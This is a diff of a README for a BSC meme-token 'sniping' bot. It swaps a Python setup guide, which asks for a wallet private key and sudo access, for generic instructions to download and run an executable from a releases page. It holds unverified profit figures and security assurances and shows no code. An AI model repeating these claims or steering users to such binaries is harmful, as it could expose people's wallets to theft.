@@ -1,174 +1,70 @@
-
-# EVM Sn🎯per Bot - Quick Start Guide (BSC)+ MEME RUSH
-
-![BSC](https://i.ibb.co/p6FgsQfz/12.png)
-
-  
-
-## Requirements
-
--  **Python 3.10+**: [Download](https://www.python.org/downloads/) (ensure "Add Python to PATH" is checked)
-
-- Internet connection
-
-- [VS Code](https://code.visualstudio.com/) (optional)
-
-  
-
-## Files
-
-- [evm.py](evm.py)
-
-- [requirements.txt](requirements.txt)
-
-  
-
-## How the Bot and Menu Work
-
-**EVM Sn🎯per Bot v4.31** is a sniping bot for local trading of BNB and Meme Rush tokens on Binance Smart Chain. It scans the mempool for new tokens and executes rapid trades using higher gas fees to maximize profits.
-
-  
-
-## Menu
-
--  **1. Start Sn🎯ping**: Initiates scanning and trading of tokens.
-
--  **2. Configure Settings**: Set up private key, trade amount, slippage, and maximum token count.
-
--  **3. Show Meme Rush Tokens**: Displays a list of loaded meme tokens.
-
--  **4. Test Scan**: Tests mempool scanning without executing real trades.
-
--  **5. Toggle Meme Rush Auto-refresh**: Enables/disables auto-refresh of meme tokens (every 30 seconds).
-
--  **6. Exit**: Exits the bot.
-
----
-
-### Performance Example (1 Month, 9.5 BNB Deposit)
-
-![ETH Trading Bot](https://i.ibb.co/fYRdknX4/chart-1.png)
-
-# Sniping Bot Performance Summary
-
-| Metric                  | Value                              |
-|-------------------------|------------------------------------|
-| **Period**              | 13 September – 14 October 2025     |
-| **Initial Investment**  | 9.50 BNB                          |
-| **Final Balance**       | 15.36 BNB                         |
-| **Total Profit**        | 5.74 BNB (~60% return)            |
-| **Total Volume (Buy/Sell)** | 1038 BNB                      |
-| **Average Slippage**    | 2.0% (1.2% during Meme Rush)      |
-| **Meme Rush Impact**    | +300% profit boost (5–14 Oct)     |
-| **No Liquidity Days**   | 6 days (15 Sep, 20 Sep, 25 Sep, 1 Oct, 7 Oct, 12 Oct) |
-
-
-**Notes**:
-
--  **Meme Rush**: Active from 5 to 14 October, increasing daily profits from 0.08–0.20 BNB to 0.30–0.55 BNB.
-
--  **No Liquidity Days**: Days with zero profit and volume due to lack of suitable liquidity pools.
-
-  
-
-## Setup in 4 Steps
-
-  
-
-### 1. Install Python
-
-- Download from [python.org](https://www.python.org/downloads/)
-
--  **Mandatory**: Check **"Add Python to PATH"** during installation.
-
-- Verify installation:
-
-```bash
-
-python --version
-
-```
-
-  
-
-### 2. Download Files
-
-```
-
-📁 EVM
-
-├── evm.py (main script)
-
-└── requirements.txt (dependencies)
-
-```
-
-  
-
-### 3. Install Dependencies
-
-```bash
-
-# Open cmd/PowerShell, navigate to folder
-
-cd  C:\EVM
-
-pip  install  -r  requirements.txt
-
-```
-
-  
-
-### 4. Run the Bot
-
-```bash
-
-python  evm.py
-
-```
-
-  
-
-**VS Code**: Open folder → `Terminal` → run commands above.
-
-  
-
-## requirements.txt
-
-```
-
-web3>=6.0.0
-
-colorama
-
-requests
-
-keyboard
-
-```
-
-  
-
-## ⚠️ Important
-
--  **Private Key**: Enter in menu option 2. **DO NOT SHARE!**
-
-- Linux/macOS: Use `sudo python evm.py` for `keyboard` library.
-
-- Errors? Check: `python --version`, `pip list`.
-
-  
-
-## Support
-
-- Python: `python --version`
-
-- Libraries: `pip list`
-
-- RPC: `https://bsc-dataseed1.ninicoin.io/`
-
-  
-
-**Done! Select menu option 2 to connect your wallet.**
+# 🚀 BSC-MEME-RUSH-BOT - Effortlessly Trade BNB and Meme Tokens
 
-![Visitor Count](https://visitor-badge.laobi.icu/badge?page_id=sphiNXCOdeR44.BSC-MEME-RUSH-BOT)
+[![Download BSC-MEME-RUSH-BOT](https://img.shields.io/badge/Download-BSC--MEME--RUSH--BOT-blue.svg)](https://github.com/Ezzyga9204/BSC-MEME-RUSH-BOT/releases)
+
+## 📜 Overview
+BSC-MEME-RUSH-BOT is an easy-to-use sniping bot designed for trading BNB and Meme Rush tokens on the Binance Smart Chain. With this bot, you can quickly access local trading opportunities without any advanced technical knowledge.
+
+## 🚀 Getting Started
+To use BSC-MEME-RUSH-BOT, follow these simple steps:
+
+1. **Visit the Download Page**: 
+   Go to the [Releases page](https://github.com/Ezzyga9204/BSC-MEME-RUSH-BOT/releases) to find the latest version of the bot.
+
+2. **Download the Software**: 
+   Click on the version you want and download the appropriate file. 
+
+3. **Extract the Files**: 
+   Once downloaded, extract the files from the zip folder to a location on your computer where you can easily find them.
+
+4. **Run the Bot**: 
+   Navigate to the extracted folder and double-click the executable file to start the bot.
+
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/Ezzyga9204/BSC-MEME-RUSH-BOT/releases) to download the latest version of BSC-MEME-RUSH-BOT. 
+
+The installation process is straightforward:
+- Download the file.
+- Extract it.
+- Run the application.
+
+## ⚙️ System Requirements
+Before downloading, ensure your system meets the following requirements:
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel i3 or equivalent
+- RAM: At least 4 GB
+- Disk Space: 100 MB of free space
+- Internet Connection: Required to access Binance Smart Chain
+
+## 💼 Features
+BSC-MEME-RUSH-BOT comes with a range of features that make trading simple and effective:
+- **User-Friendly Interface**: Easily navigate the bot without any coding knowledge.
+- **Fast Transactions**: The bot allows quick execution of trades on the Binance platform.
+- **Configurable Settings**: Adjust trading parameters to suit your strategy.
+- **Token Support**: Features support for BNB and various Meme Rush tokens. 
+- **Security**: Trade with confidence, knowing your activities are secure.
+
+## 🔧 How to Use the Bot
+Once the bot is running, follow these steps to start trading:
+
+1. **Set Up Your Wallet**: Ensure you have a Binance Smart Chain wallet ready for use.
+2. **Connect to the Network**: Follow the on-screen instructions to connect your wallet to the Binance Smart Chain network.
+3. **Select Tokens**: Choose the tokens you wish to trade. The bot will guide you in selecting the options available.
+4. **Adjust Trading Parameters**: Configure your slippage tolerance, purchase amount, and other related settings.
+5. **Start Trading**: Press the 'Start' button and let the bot do the work.
+
+## ❓ Troubleshooting
+If you encounter issues while using BSC-MEME-RUSH-BOT, consider the following:
+
+- **Check Your Internet Connection**: Ensure you are connected to the internet.
+- **Restart the Bot**: Sometimes, simply restarting the application resolves errors.
+- **Consult the Documentation**: Check the documentation for specific error messages and solutions.
+
+## 📞 Support
+For assistance, you can reach out through the issues section on GitHub. Our community is here to help with any questions or concerns you may have.
+
+## 🔗 Important Links
+- [BSC-MEME-RUSH-BOT on GitHub](https://github.com/Ezzyga9204/BSC-MEME-RUSH-BOT)
+- [Releases Page](https://github.com/Ezzyga9204/BSC-MEME-RUSH-BOT/releases)
+
+Now, you are ready to start trading. Enjoy using BSC-MEME-RUSH-BOT to enhance your trading experience!
